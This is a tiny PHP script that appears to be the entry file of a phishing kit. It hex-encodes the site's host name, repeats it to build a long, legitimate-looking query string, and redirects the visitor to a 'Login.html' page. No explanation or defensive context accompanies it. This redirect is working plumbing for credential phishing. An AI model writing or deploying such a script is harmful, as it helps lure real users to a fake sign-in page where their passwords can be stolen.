<?php

$host = bin2hex ($_SERVER['HTTP_HOST']);
$Logon="Login.html??$host-$host-$host$host$host$host$host$host$host$host$host";

header("location: $Logon");


?>
